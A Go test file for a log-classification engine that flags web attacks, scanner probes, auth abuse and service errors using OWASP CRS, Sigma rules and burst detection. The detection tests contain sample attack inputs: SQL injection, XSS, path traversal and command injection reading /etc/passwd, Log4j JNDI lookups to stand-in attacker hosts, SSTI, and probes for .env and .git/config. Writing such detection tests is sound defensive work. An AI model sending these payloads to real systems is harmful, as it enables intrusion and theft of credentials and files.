package logclassify

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"slices"
	"strings"
	"sync"
	"testing"
)

func TestNewEngineLoadsEmbeddedRulesAndZeroFalsePositivesOnNormalTraffic(t *testing.T) {
	eng, err := NewEngine()
	if err != nil {
		t.Fatalf("NewEngine failed: %v", err)
	}
	info := eng.Info()
	if info.CorazaVersion != "v3" || !strings.Contains(info.CRSVersion, "4.25.0") {
		t.Fatalf("unexpected engine info: %+v", info)
	}
	if info.SigmaRules < 9 {
		t.Fatalf("expected >= 9 embedded Sigma rules, got %d", info.SigmaRules)
	}

	normalEntries := []LogEntry{
		{
			Timestamp: "2026-11-26T00:00:00Z",
			Service:   "nginx-proxy",
			Level:     "info",
			Message:   "200 cubus.sh GET / HTTP/2",
			Structured: &StructuredLog{
				Host:      "cubus.sh",
				Status:    200,
				Request:   "GET / HTTP/2",
				ClientIP:  "203.0.113.10",
				UserAgent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36",
			},
		},
		{
			Timestamp: "2026-11-26T00:00:01Z",
			Service:   "nginx-proxy",
			Level:     "info",
			Message:   "200 admin.cubus.sh GET /api/healthz HTTP/1.1",
			Structured: &StructuredLog{
				Host:      "admin.cubus.sh",
				Status:    200,
				Request:   "GET /api/healthz HTTP/1.1",
				ClientIP:  "127.0.0.1",
				UserAgent: "Mozilla/5.0 (compatible; Healthcheck/1.0)",
			},
		},
		{
			Timestamp: "2026-11-26T00:00:02Z",
			Service:   "nginx-proxy",
			Level:     "info",
			Message:   "200 admin.cubus.sh GET /static/vendor/tabler.min.css?v=abc123 HTTP/2",
			Structured: &StructuredLog{
				Host:      "admin.cubus.sh",
				Status:    200,
				Request:   "GET /static/vendor/tabler.min.css?v=abc123 HTTP/2",
				ClientIP:  "203.0.113.11",
				UserAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
				Referer:   "https://admin.cubus.sh/logs",
			},
		},
		{
			Timestamp: "2026-11-26T00:00:03Z",
			Service:   "nginx-proxy",
			Level:     "info",
			Message:   "200 choice.cubus.sh POST /api/classify HTTP/2",
			Structured: &StructuredLog{
				Host:      "choice.cubus.sh",
				Status:    200,
				Request:   "POST /api/classify HTTP/2",
				ClientIP:  "203.0.113.12",
				UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/132.0",
			},
		},
		{
			Timestamp: "2026-11-26T00:00:04Z",
			Service:   "nginx-proxy",
			Level:     "info",
			Message:   "200 choice.cubus.sh POST /api/classify HTTP/1.1",
			Structured: &StructuredLog{
				Host:      "choice.cubus.sh",
				Status:    200,
				Request:   "POST /api/classify HTTP/1.1",
				ClientIP:  "203.0.113.13",
				UserAgent: "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Gecko/20100101 Firefox/132.0",
			},
		},
		{
			Timestamp: "2026-11-26T00:00:05Z",
			Service:   "nginx-proxy",
			Level:     "info",
			Message:   "200 mcp.cubus.sh GET /mcp HTTP/2",
			Structured: &StructuredLog{
				Host:      "mcp.cubus.sh",
				Status:    200,
				Request:   "GET /mcp HTTP/2",
				ClientIP:  "203.0.113.14",
				UserAgent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
			},
		},
		{
			Timestamp: "2026-11-26T00:00:05Z",
			Service:   "nginx-proxy",
			Level:     "info",
			Message:   "200 admin.cubus.sh PATCH /api/services/choice/settings HTTP/2",
			Structured: &StructuredLog{
				Host:      "admin.cubus.sh",
				Status:    200,
				Request:   "PATCH /api/services/choice/settings HTTP/2",
				ClientIP:  "203.0.113.15",
				UserAgent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
			},
		},
		{
			Timestamp: "2026-11-26T00:00:05Z",
			Service:   "nginx-proxy",
			Level:     "info",
			Message:   "204 artifact.cubus.sh DELETE /api/items/123 HTTP/1.1",
			Structured: &StructuredLog{
				Host:      "artifact.cubus.sh",
				Status:    204,
				Request:   "DELETE /api/items/123 HTTP/1.1",
				ClientIP:  "203.0.113.16",
				UserAgent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
			},
		},
		{
			Timestamp: "2026-11-26T00:00:05Z",
			Service:   "nginx-proxy",
			Level:     "info",
			Message:   "200 artifact.cubus.sh PUT /api/items/123 HTTP/2",
			Structured: &StructuredLog{
				Host:      "artifact.cubus.sh",
				Status:    200,
				Request:   "PUT /api/items/123 HTTP/2",
				ClientIP:  "203.0.113.17",
				UserAgent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
			},
		},
		{
			Timestamp: "2026-11-26T00:00:05Z",
			Service:   "nginx-proxy",
			Level:     "info",
			Message:   "204 cubus.sh OPTIONS / HTTP/1.1",
			Structured: &StructuredLog{
				Host:      "cubus.sh",
				Status:    204,
				Request:   "OPTIONS / HTTP/1.1",
				ClientIP:  "203.0.113.18",
				UserAgent: "Mozilla/5.0",
			},
		},
		{
			Timestamp: "2026-11-26T00:00:05Z",
			Service:   "nginx-proxy",
			Level:     "info",
			Message:   "200 cubus.sh HEAD /healthz HTTP/1.1",
			Structured: &StructuredLog{
				Host:      "cubus.sh",
				Status:    200,
				Request:   "HEAD /healthz HTTP/1.1",
				ClientIP:  "127.0.0.1",
				UserAgent: "Healthcheck/1.0",
			},
		},
		{
			Timestamp: "2026-11-26T00:00:06Z",
			Service:   "cloudflared",
			Level:     "info",
			Message:   "INF Registered tunnel connection connIndex=0 location=icn01",
		},
		{
			Timestamp: "2026-11-26T00:00:07Z",
			Service:   "admin",
			Level:     "info",
			Message:   "admin HTTP server listening addr=:8000",
		},
		{
			Timestamp: "2026-11-26T00:00:08Z",
			Service:   "artifact",
			Level:     "info",
			Message:   "worker in invalid state recovered; SSRF protection initialized; permission denied for non-postgres check; FATAL: benign note",
		},
		{
			Timestamp: "2026-11-26T00:00:09Z",
			Service:   "nginx-proxy",
			Level:     "info",
			Message:   `request="GET /index.html HTTP/1.1"`,
		},
		{
			Timestamp: "2026-11-26T00:00:10Z",
			Service:   "nginx-proxy",
			Level:     "info",
			Message:   "200 admin.cubus.sh GET /api/logs/search?q=FATAL:+invalid+CSRF+token HTTP/2",
			Structured: &StructuredLog{
				Host:      "admin.cubus.sh",
				Status:    200,
				Request:   "GET /api/logs/search?q=FATAL:+invalid+CSRF+token HTTP/2",
				ClientIP:  "203.0.113.19",
				UserAgent: "Mozilla/5.0",
			},
		},
	}

	results, err := eng.ClassifyBatch(context.Background(), normalEntries)
	if err != nil {
		t.Fatalf("ClassifyBatch failed: %v", err)
	}
	if len(results) != len(normalEntries) {
		t.Fatalf("expected %d results, got %d", len(normalEntries), len(results))
	}
	for i, r := range results {
		if r.Verdict != VerdictClean || r.Category != CategoryClean || len(r.Matches) != 0 {
			t.Fatalf("false positive on normal entry %d (%q): verdict=%s category=%s matches=%+v",
				i, normalEntries[i].Message, r.Verdict, r.Category, r.Matches)
		}
	}
}

func TestOWASPCRSDetection(t *testing.T) {
	eng, err := NewEngine()
	if err != nil {
		t.Fatal(err)
	}

	cases := []struct {
		name     string
		entry    LogEntry
		wantCat  string
		wantPref string // CRS rule ID prefix
	}{
		{
			name: "sqli union select",
			entry: LogEntry{
				Service: "nginx-proxy",
				Structured: &StructuredLog{
					Host:      "cubus.sh",
					Status:    400,
					Request:   "GET /search?id=1%20UNION%20SELECT%201,2,3-- HTTP/2",
					ClientIP:  "198.51.100.1",
					UserAgent: "Mozilla/5.0",
				},
			},
			wantCat:  CategorySQLi,
			wantPref: "942",
		},
		{
			name: "sqli tautology",
			entry: LogEntry{
				Service: "nginx-proxy",
				Structured: &StructuredLog{
					Host:      "cubus.sh",
					Status:    200,
					Request:   "GET /login?user=admin'%20OR%201=1-- HTTP/1.1",
					ClientIP:  "198.51.100.2",
					UserAgent: "Mozilla/5.0",
				},
			},
			wantCat:  CategorySQLi,
			wantPref: "942",
		},
		{
			name: "xss script tag",
			entry: LogEntry{
				Service: "nginx-proxy",
				Structured: &StructuredLog{
					Host:      "cubus.sh",
					Status:    200,
					Request:   "GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/2",
					ClientIP:  "198.51.100.3",
					UserAgent: "Mozilla/5.0",
				},
			},
			wantCat:  CategoryXSS,
			wantPref: "941",
		},
		{
			name: "lfi path traversal",
			entry: LogEntry{
				Service: "nginx-proxy",
				Structured: &StructuredLog{
					Host:      "cubus.sh",
					Status:    404,
					Request:   "GET /download?file=../../../../etc/passwd HTTP/2",
					ClientIP:  "198.51.100.4",
					UserAgent: "Mozilla/5.0",
				},
			},
			wantCat:  CategoryLFITraversal,
			wantPref: "930",
		},
		{
			name: "rce command injection",
			entry: LogEntry{
				Service: "nginx-proxy",
				Structured: &StructuredLog{
					Host:      "cubus.sh",
					Status:    400,
					Request:   "GET /run?cmd=;cat%20/etc/passwd HTTP/2",
					ClientIP:  "198.51.100.5",
					UserAgent: "Mozilla/5.0",
				},
			},
			wantCat:  CategoryRCEInjection,
			wantPref: "932",
		},
		{
			name: "scanner user agent sqlmap",
			entry: LogEntry{
				Service: "nginx-proxy",
				Structured: &StructuredLog{
					Host:      "cubus.sh",
					Status:    404,
					Request:   "GET /items HTTP/2",
					ClientIP:  "198.51.100.6",
					UserAgent: "sqlmap/1.8#stable (https://sqlmap.org)",
				},
			},
			wantCat:  CategoryScannerRecon,
			wantPref: "913",
		},
		{
			name: "scanner user agent nikto",
			entry: LogEntry{
				Service: "nginx-proxy",
				Structured: &StructuredLog{
					Host:      "cubus.sh",
					Status:    404,
					Request:   "GET /admin-check HTTP/1.1",
					ClientIP:  "198.51.100.7",
					UserAgent: "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)",
				},
			},
			wantCat:  CategoryScannerRecon,
			wantPref: "913",
		},
		{
			name: "log4j jndi injection",
			entry: LogEntry{
				Service: "nginx-proxy",
				Structured: &StructuredLog{
					Host:      "cubus.sh",
					Status:    400,
					Request:   "GET /?q=$%7Bjndi:ldap://evil.example/a%7D HTTP/2",
					ClientIP:  "198.51.100.8",
					UserAgent: "Mozilla/5.0",
				},
			},
			wantCat:  CategoryRCEInjection,
			wantPref: "944",
		},
		{
			name: "user_agent sqlmap without request line",
			entry: LogEntry{
				Service: "nginx-proxy",
				Structured: &StructuredLog{
					Host:      "cubus.sh",
					Status:    403,
					ClientIP:  "198.51.100.9",
					UserAgent: "sqlmap/1.8",
				},
			},
			wantCat:  CategoryScannerRecon,
			wantPref: "913",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res, err := eng.ClassifyBatch(context.Background(), []LogEntry{tc.entry})
			if err != nil {
				t.Fatalf("ClassifyBatch failed: %v", err)
			}
			r := res[0]
			if r.Verdict == VerdictClean {
				t.Fatalf("expected non-clean verdict, got clean")
			}
			if !slices.Contains(r.Engines, EngineOWASPCRS) {
				t.Fatalf("expected owasp_crs in engines, got %v (matches=%+v)", r.Engines, r.Matches)
			}
			foundCRS := false
			for _, m := range r.Matches {
				if m.Engine == EngineOWASPCRS && strings.HasPrefix(m.RuleID, tc.wantPref) {
					foundCRS = true
					break
				}
			}
			if !foundCRS {
				t.Fatalf("expected CRS rule prefix %s, got matches %+v", tc.wantPref, r.Matches)
			}
			if r.Category != tc.wantCat {
				t.Fatalf("expected category %s, got %s (matches=%+v)", tc.wantCat, r.Category, r.Matches)
			}
		})
	}
}

func TestSigmaRulesDetection(t *testing.T) {
	eng, err := NewEngine()
	if err != nil {
		t.Fatal(err)
	}

	cases := []struct {
		name    string
		entry   LogEntry
		wantCat string
	}{
		{
			name: "sensitive .env probe",
			entry: LogEntry{
				Service: "nginx-proxy",
				Level:   "warn",
				Message: "404 cubus.sh GET /.env HTTP/2",
				Structured: &StructuredLog{
					Host:     "cubus.sh",
					Status:   404,
					Request:  "GET /.env HTTP/2",
					ClientIP: "198.51.100.10",
				},
			},
			wantCat: CategoryScannerRecon,
		},
		{
			name: "sensitive .git/config probe",
			entry: LogEntry{
				Service: "nginx-proxy",
				Message: "404 cubus.sh GET /.git/config HTTP/2",
				Structured: &StructuredLog{
					Status:  404,
					Request: "GET /.git/config HTTP/2",
				},
			},
			wantCat: CategoryScannerRecon,
		},
		{
			name: "wp-login probe",
			entry: LogEntry{
				Service: "nginx-proxy",
				Message: "404 cubus.sh GET /wp-login.php HTTP/1.1",
				Structured: &StructuredLog{
					Status:  404,
					Request: "GET /wp-login.php HTTP/1.1",
				},
			},
			wantCat: CategoryScannerRecon,
		},
		{
			name: "jndi exploit in user agent",
			entry: LogEntry{
				Service: "nginx-proxy",
				Message: "200 cubus.sh GET / HTTP/2",
				Structured: &StructuredLog{
					Status:    200,
					Request:   "GET / HTTP/2",
					UserAgent: "${jndi:ldap://attacker.invalid/x}",
				},
			},
			wantCat: CategoryRCEInjection,
		},
		{
			name: "ssti probe",
			entry: LogEntry{
				Service: "nginx-proxy",
				Message: "400 cubus.sh GET /render?name={{7*7}} HTTP/2",
				Structured: &StructuredLog{
					Status:  400,
					Request: "GET /render?name={{7*7}} HTTP/2",
				},
			},
			wantCat: CategoryRCEInjection,
		},
		{
			name: "admin CSRF rejection",
			entry: LogEntry{
				Service: "admin",
				Level:   "warn",
				Message: "rejected request: invalid CSRF token from 203.0.113.99",
			},
			wantCat: CategoryAuthAbuse,
		},
		{
			name: "google login unauthorized",
			entry: LogEntry{
				Service: "admin",
				Level:   "warn",
				Message: "rejected unauthorized google login email=mallory@evil.example",
			},
			wantCat: CategoryAuthAbuse,
		},
		{
			name: "cloudflare mismatch",
			entry: LogEntry{
				Service: "admin",
				Level:   "warn",
				Message: "rejected google login mismatched with cloudflare access",
			},
			wantCat: CategoryAuthAbuse,
		},
		{
			name: "admin bearer token error",
			entry: LogEntry{
				Service: "choice",
				Level:   "warn",
				Message: "401 missing or invalid admin bearer token",
			},
			wantCat: CategoryAuthAbuse,
		},
		{
			name: "mcp bearer error",
			entry: LogEntry{
				Service: "mcp",
				Level:   "warn",
				Message: "Invalid or missing Bearer key for /mcp",
			},
			wantCat: CategoryAuthAbuse,
		},
		{
			name: "postgres auth failure",
			entry: LogEntry{
				Service: "postgres",
				Level:   "error",
				Message: `FATAL:  password authentication failed for user "postgres"`,
			},
			wantCat: CategoryDBSecurity,
		},
		{
			name: "postgres copy program probe",
			entry: LogEntry{
				Service: "postgres",
				Level:   "error",
				Message: `ERROR:  COPY t FROM PROGRAM 'id' denied for non-superuser`,
			},
			wantCat: CategoryDBSecurity,
		},
		{
			name: "cuda out of memory",
			entry: LogEntry{
				Service: "choice",
				Level:   "error",
				Message: "RuntimeError: CUDA out of memory. Tried to allocate 2.00 GiB",
			},
			wantCat: CategoryServiceError,
		},
		{
			name: "go panic",
			entry: LogEntry{
				Service: "ops-agent",
				Level:   "error",
				Message: "panic: runtime error: invalid memory address or nil pointer dereference",
			},
			wantCat: CategoryServiceError,
		},
		{
			name: "python traceback",
			entry: LogEntry{
				Service: "artifact",
				Level:   "error",
				Message: "Traceback (most recent call last): File app.py",
			},
			wantCat: CategoryServiceError,
		},
		{
			name: "cloudflared origin error",
			entry: LogEntry{
				Service: "cloudflared",
				Level:   "error",
				Message: "ERR Unable to reach the origin service error=\"dial tcp 172.30.0.10:80: connect: connection refused\"",
			},
			wantCat: CategoryServiceError,
		},
		{
			name: "http 401 on admin route",
			entry: LogEntry{
				Service: "nginx-proxy",
				Level:   "warn",
				Message: "401 admin.cubus.sh GET /admin/v1/settings HTTP/2",
				Structured: &StructuredLog{
					Host:    "admin.cubus.sh",
					Status:  401,
					Request: "GET /admin/v1/settings HTTP/2",
				},
			},
			wantCat: CategoryAuthAbuse,
		},
		{
			name: "http 502 server error",
			entry: LogEntry{
				Service: "nginx-proxy",
				Level:   "error",
				Message: "502 cubus.sh GET /api/run HTTP/2",
				Structured: &StructuredLog{
					Host:    "cubus.sh",
					Status:  502,
					Request: "GET /api/run HTTP/2",
				},
			},
			wantCat: CategoryServiceError,
		},
		{
			name: "ssrf block",
			entry: LogEntry{
				Service: "artifact",
				Level:   "warn",
				Message: "SSRF protection: private address blocked 169.254.169.254",
			},
			wantCat: CategoryRCEInjection,
		},
		{
			name: "git probe with query string",
			entry: LogEntry{
				Service: "nginx-proxy",
				Level:   "warn",
				Message: "404 cubus.sh GET /.git?x=1 HTTP/2",
				Structured: &StructuredLog{
					Host:    "cubus.sh",
					Status:  404,
					Request: "GET /.git?x=1 HTTP/2",
				},
			},
			wantCat: CategoryScannerRecon,
		},
		{
			name: "percent-encoded env alongside invalid percent",
			entry: LogEntry{
				Service: "nginx-proxy",
				Level:   "warn",
				Message: "404 cubus.sh GET /search?q=100%&p=%2eenv HTTP/2",
				Structured: &StructuredLog{
					Host:    "cubus.sh",
					Status:  404,
					Request: "GET /search?q=100%&p=%2eenv HTTP/2",
				},
			},
			wantCat: CategoryScannerRecon,
		},
		{
			name: "oauth warn invalid state",
			entry: LogEntry{
				Service: "admin",
				Level:   "warn",
				Message: "oauth callback failed: invalid state",
			},
			wantCat: CategoryAuthAbuse,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res, err := eng.ClassifyBatch(context.Background(), []LogEntry{tc.entry})
			if err != nil {
				t.Fatalf("ClassifyBatch failed: %v", err)
			}
			r := res[0]
			if r.Verdict == VerdictClean {
				t.Fatalf("expected non-clean verdict for %q", tc.entry.Message)
			}
			if !slices.Contains(r.Engines, EngineSigma) {
				t.Fatalf("expected sigma engine to match, got engines=%v matches=%+v", r.Engines, r.Matches)
			}
			foundSigma := false
			for _, m := range r.Matches {
				if m.Engine == EngineSigma && m.Category == tc.wantCat {
					foundSigma = true
					break
				}
			}
			if !foundSigma {
				t.Fatalf("expected sigma match with category %s, got matches=%+v", tc.wantCat, r.Matches)
			}
		})
	}
}

func TestBurstCorrelation(t *testing.T) {
	eng, err := NewEngine()
	if err != nil {
		t.Fatal(err)
	}

	var batch []LogEntry
	// 6 x 404 from 198.51.100.42 -> BURST-IP-4XX (medium)
	for i := 0; i < 6; i++ {
		batch = append(batch, LogEntry{
			Service: "nginx-proxy",
			Level:   "warn",
			Message: fmt.Sprintf("404 cubus.sh GET /probe-%d HTTP/2", i),
			Structured: &StructuredLog{
				Host:     "cubus.sh",
				Status:   404,
				Request:  fmt.Sprintf("GET /probe-%d HTTP/2", i),
				ClientIP: "198.51.100.42",
			},
		})
	}
	// 15 x 403 from 198.51.100.99 -> BURST-IP-4XX (high)
	for i := 0; i < 15; i++ {
		batch = append(batch, LogEntry{
			Service: "nginx-proxy",
			Level:   "warn",
			Message: fmt.Sprintf("403 cubus.sh GET /secret-%d HTTP/2", i),
			Structured: &StructuredLog{
				Host:     "cubus.sh",
				Status:   403,
				Request:  fmt.Sprintf("GET /secret-%d HTTP/2", i),
				ClientIP: "198.51.100.99",
			},
		})
	}
	// 5 x 502 for artifact -> BURST-SVC-5XX
	for i := 0; i < 5; i++ {
		batch = append(batch, LogEntry{
			Service: "artifact",
			Level:   "error",
			Message: "502 upstream timeout",
			Structured: &StructuredLog{
				Host:     "artifact.cubus.sh",
				Status:   502,
				Request:  "GET /items HTTP/2",
				ClientIP: fmt.Sprintf("203.0.113.%d", i+10),
			},
		})
	}

	results, err := eng.ClassifyBatch(context.Background(), batch)
	if err != nil {
		t.Fatalf("ClassifyBatch failed: %v", err)
	}
	hasMatch := func(r RuleResult, ruleID, sev string) bool {
		for _, m := range r.Matches {
			if m.Engine == EngineBurst && m.RuleID == ruleID && (sev == "" || m.Severity == sev) {
				return true
			}
		}
		return false
	}

	if !hasMatch(results[0], "BURST-IP-4XX", VerdictMedium) {
		t.Fatalf("expected medium BURST-IP-4XX on first batch, got %+v", results[0].Matches)
	}
	if !hasMatch(results[6], "BURST-IP-4XX", VerdictHigh) {
		t.Fatalf("expected high BURST-IP-4XX on 15-hit batch, got %+v", results[6].Matches)
	}
	if !hasMatch(results[21], "BURST-SVC-5XX", VerdictMedium) {
		t.Fatalf("expected BURST-SVC-5XX on 5xx service batch, got %+v", results[21].Matches)
	}

	// Boundary checks: 4 hits should not trigger; ClientIP "-" ignored; >5m spread does not burst;
	// multi-vhost 5xx under nginx-proxy does not collapse across distinct hosts.
	var noBurst []LogEntry
	for i := 0; i < 4; i++ {
		noBurst = append(noBurst, LogEntry{
			Timestamp:  fmt.Sprintf("2026-11-26T00:00:0%dZ", i),
			Service:    "nginx-proxy",
			Structured: &StructuredLog{Host: "cubus.sh", Status: 404, Request: "GET /x HTTP/2", ClientIP: "198.51.100.77"},
		})
	}
	for i := 0; i < 6; i++ {
		noBurst = append(noBurst, LogEntry{
			Timestamp:  fmt.Sprintf("2026-11-26T00:00:0%dZ", i),
			Service:    "nginx-proxy",
			Structured: &StructuredLog{Host: "cubus.sh", Status: 404, Request: "GET /y HTTP/2", ClientIP: "-"},
		})
	}
	// 5 hits spread 2 hours apart -> outside 5m burst window.
	for i := 0; i < 5; i++ {
		noBurst = append(noBurst, LogEntry{
			Timestamp:  fmt.Sprintf("2026-11-26T%02d:00:00Z", i*2),
			Service:    "nginx-proxy",
			Structured: &StructuredLog{Host: "cubus.sh", Status: 404, Request: "GET /z HTTP/2", ClientIP: "198.51.100.88"},
		})
	}
	// 3x 502 on host A + 3x 502 on host B -> neither reaches 5 per host.
	for i := 0; i < 3; i++ {
		noBurst = append(noBurst,
			LogEntry{Timestamp: "2026-11-26T01:00:00Z", Service: "nginx-proxy", Structured: &StructuredLog{Host: "a.cubus.sh", Status: 502, Request: "GET /a HTTP/2"}},
			LogEntry{Timestamp: "2026-11-26T01:00:00Z", Service: "nginx-proxy", Structured: &StructuredLog{Host: "b.cubus.sh", Status: 502, Request: "GET /b HTTP/2"}},
		)
	}
	noBurstRes, err := eng.ClassifyBatch(context.Background(), noBurst)
	if err != nil {
		t.Fatalf("ClassifyBatch failed: %v", err)
	}
	for i, r := range noBurstRes {
		if hasMatch(r, "BURST-IP-4XX", "") || hasMatch(r, "BURST-SVC-5XX", "") {
			t.Fatalf("unexpected burst trigger on entry %d: %+v", i, r.Matches)
		}
	}
}

func TestAmberBoundaryAndSummary(t *testing.T) {
	// 50x 4-byte UTF-8 emoji entries and 50x HTML-character (<>&) entries must NEVER breach
	// MaxAmberBodyBytes or cause batch-wide DoS, and HTML chars must not be escaped as \u003c.
	for _, tc := range []struct {
		name string
		msg  string
	}{
		{"4byte-utf8-emoji", strings.Repeat("🔥", MaxAmberItemChars)},
		{"html-special-chars", strings.Repeat("<>&\"\\", MaxAmberItemChars)},
	} {
		t.Run(tc.name, func(t *testing.T) {
			entries := make([]LogEntry, MaxAmberBatch)
			idx := make([]int, MaxAmberBatch)
			for i := range entries {
				idx[i] = i
				entries[i] = LogEntry{
					Service: "admin",
					Message: tc.msg,
				}
			}
			raw, err := BuildAmberBatchRequest(entries, idx)
			if err != nil {
				t.Fatalf("BuildAmberBatchRequest failed on %s: %v", tc.name, err)
			}
			if len(raw) > MaxAmberBodyBytes {
				t.Fatalf("expected payload <= %d bytes, got %d", MaxAmberBodyBytes, len(raw))
			}
			if tc.name == "html-special-chars" && (strings.Contains(string(raw), `\u003c`) || strings.Contains(string(raw), `\u003e`) || strings.Contains(string(raw), `\u0026`)) {
				t.Fatalf("expected SetEscapeHTML(false) without \\u003c/\\u003e/\\u0026 escaping")
			}
		})
	}

	// Mismatched item IDs in response must return error.
	if _, _, err := ParseAmberBatchResponse([]byte(`{"model":"amber-150m","results":[{"id":"999","choice":"normal"}]}`), []int{0}); err == nil {
		t.Fatalf("expected error when no response IDs match selected indices")
	}

	summary := BuildSummary([]EntryClassification{
		{Index: 0, Rule: &RuleResult{Verdict: VerdictClean, Category: CategoryClean}, Amber: &AmberResult{Evaluated: true, Choice: "normal"}},
		{Index: 1, Rule: &RuleResult{Verdict: VerdictHigh, Category: CategoryAuthAbuse}, Amber: &AmberResult{Evaluated: false}},
		{Index: 2, Rule: &RuleResult{Verdict: VerdictClean, Category: CategoryClean}, Amber: &AmberResult{Evaluated: true, Choice: "suspicious_recon"}},
	})
	if summary.Total != 3 || summary.RuleFlagged != 1 || summary.AmberFlagged != 1 || summary.FlaggedTotal != 2 {
		t.Fatalf("unexpected summary counts: %+v", summary)
	}
}

func TestAmberSelectionRequestAndParsing(t *testing.T) {
	entries := make([]LogEntry, 60)
	ruleRes := make([]RuleResult, 60)
	for i := range entries {
		entries[i] = LogEntry{
			Timestamp: fmt.Sprintf("2026-11-26T00:00:%02dZ", i),
			Service:   "nginx-proxy",
			Level:     "info",
			Message:   fmt.Sprintf("200 cubus.sh GET /ok-%d HTTP/2", i),
			Structured: &StructuredLog{
				Host:     "cubus.sh",
				Status:   200,
				Request:  fmt.Sprintf("GET /ok-%d HTTP/2", i),
				ClientIP: "203.0.113.1",
			},
		}
		ruleRes[i] = RuleResult{Verdict: VerdictClean, Category: CategoryClean}
	}
	// Mark index 2 as rule-flagged and index 5 as error.
	ruleRes[2] = RuleResult{Verdict: VerdictCritical, Category: CategorySQLi, Score: 10}
	entries[5].Level = "error"
	entries[5].Message = "500 boom"

	selected := SelectAmberIndices(entries, ruleRes, MaxAmberBatch)
	if len(selected) != MaxAmberBatch {
		t.Fatalf("expected %d selected indices, got %d", MaxAmberBatch, len(selected))
	}
	if !slices.Contains(selected, 2) || !slices.Contains(selected, 5) {
		t.Fatalf("expected priority indices 2 and 5 to be selected, got %v", selected)
	}

	body, err := BuildAmberBatchRequest(entries, selected)
	if err != nil {
		t.Fatalf("BuildAmberBatchRequest failed: %v", err)
	}
	var reqObj amberBatchRequest
	if err := json.Unmarshal(body, &reqObj); err != nil {
		t.Fatal(err)
	}
	if len(reqObj.Items) != MaxAmberBatch || len(reqObj.Labels) != 4 {
		t.Fatalf("unexpected amber batch payload: items=%d labels=%d", len(reqObj.Items), len(reqObj.Labels))
	}

	// Test ParseAmberBatchResponse with an item-level error and valid item.
	rawResp := []byte(`{
		"model": "amber-150m",
		"results": [
			{"id": "2", "choice": "malicious_attack", "probabilities": {"normal": 0.01, "operational_error": 0.02, "suspicious_recon": 0.12, "malicious_attack": 0.85}},
			{"id": "5", "error": "item failed"}
		]
	}`)
	model, parsed, err := ParseAmberBatchResponse(rawResp, selected)
	if err != nil {
		t.Fatalf("ParseAmberBatchResponse failed: %v", err)
	}
	if model != "amber-150m" {
		t.Fatalf("unexpected model %q", model)
	}
	if !parsed[2].Evaluated || parsed[2].Choice != "malicious_attack" || parsed[2].Confidence != 0.85 {
		t.Fatalf("unexpected parsed result[2]: %+v", parsed[2])
	}
	if parsed[5].Evaluated || parsed[5].Error != "item failed" {
		t.Fatalf("unexpected parsed result[5]: %+v", parsed[5])
	}

	// Ensure BuildAmberText safely truncates long messages to MaxAmberItemChars.
	longEntry := LogEntry{
		Service: "admin",
		Level:   "warn",
		Message: strings.Repeat("あ", 2000),
	}
	txt := BuildAmberText(longEntry)
	if len([]rune(txt)) > MaxAmberItemChars {
		t.Fatalf("expected <= %d runes, got %d", MaxAmberItemChars, len([]rune(txt)))
	}

	// Verify httptest mock server compatibility check.
	mockChoice := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write(rawResp)
	}))
	defer mockChoice.Close()
}

func TestClassifyBatchConcurrencyRace(t *testing.T) {
	eng, err := NewEngine()
	if err != nil {
		t.Fatal(err)
	}

	batch := []LogEntry{
		{
			Service: "nginx-proxy",
			Level:   "info",
			Message: "200 cubus.sh GET / HTTP/2",
			Structured: &StructuredLog{
				Host: "cubus.sh", Status: 200, Request: "GET / HTTP/2", ClientIP: "203.0.113.10", UserAgent: "Mozilla/5.0",
			},
		},
		{
			Service: "nginx-proxy",
			Level:   "warn",
			Message: "404 cubus.sh GET /.env HTTP/2",
			Structured: &StructuredLog{
				Host: "cubus.sh", Status: 404, Request: "GET /.env HTTP/2", ClientIP: "198.51.100.5", UserAgent: "sqlmap/1.8",
			},
		},
		{
			Service: "nginx-proxy",
			Level:   "warn",
			Message: "400 cubus.sh GET /?id=1%20UNION%20SELECT%201,2 HTTP/2",
			Structured: &StructuredLog{
				Host: "cubus.sh", Status: 400, Request: "GET /?id=1%20UNION%20SELECT%201,2 HTTP/2", ClientIP: "198.51.100.6", UserAgent: "Mozilla/5.0",
			},
		},
		{
			Service: "postgres",
			Level:   "error",
			Message: "FATAL: password authentication failed for user postgres",
		},
		{
			Service: "cloudflared",
			Level:   "error",
			Message: "ERR Unable to reach the origin service",
		},
		{
			Service: "nginx-proxy",
			Level:   "warn",
			Message: "401 admin.cubus.sh GET /admin/v1/settings HTTP/2",
			Structured: &StructuredLog{
				Host: "admin.cubus.sh", Status: 401, Request: "GET /admin/v1/settings HTTP/2",
			},
		},
	}

	var wg sync.WaitGroup
	for g := 0; g < 16; g++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for iter := 0; iter < 5; iter++ {
				res, err := eng.ClassifyBatch(context.Background(), batch)
				if err != nil || len(res) != len(batch) || res[0].Verdict != VerdictClean || res[1].Verdict == VerdictClean || res[2].Category != CategorySQLi || res[4].Verdict == VerdictClean || res[5].Verdict == VerdictClean {
					t.Errorf("unexpected concurrent classification result: err=%v res=%+v", err, res)
					return
				}
			}
		}()
	}
	wg.Wait()
}

func TestClassifyBatchContextCancellation(t *testing.T) {
	eng, err := NewEngine()
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	res, err := eng.ClassifyBatch(ctx, []LogEntry{{Service: "admin", Message: "ok"}})
	if !errors.Is(err, context.Canceled) || res != nil {
		t.Fatalf("expected context.Canceled and nil results, got err=%v res=%+v", err, res)
	}
}

